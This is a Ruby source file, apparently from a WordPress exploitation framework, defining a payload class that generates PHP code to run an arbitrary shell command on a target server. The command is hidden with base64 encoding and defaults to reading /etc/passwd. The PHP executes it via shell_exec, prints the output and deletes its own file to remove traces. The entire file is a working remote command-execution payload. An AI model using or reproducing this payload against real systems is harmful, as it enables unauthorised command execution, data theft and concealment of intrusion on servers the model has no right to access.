require 'base64'

module Wpxf::Payloads
  # Executes a system command and returns the output.
  class Exec < Wpxf::Payload
    include Wpxf
    include Wpxf::Options

    def initialize
      super

      register_options([
        StringOption.new(
          name: 'cmd',
          required: true,
          default: 'cat /etc/passwd',
          desc: 'Command to run'
        )
      ])
    end

    def encoded_cmd
      Base64.strict_encode64(datastore['cmd'])
    end

    def encoded
      php_vars = generate_vars([:cmd])
      [
        '<?php',
        "$#{php_vars[:cmd]} = base64_decode('#{encoded_cmd}');",
        "echo shell_exec($#{php_vars[:cmd]});",
        'unlink(__FILE__);',
        '?>'
      ].join("\n")
    end
  end
end
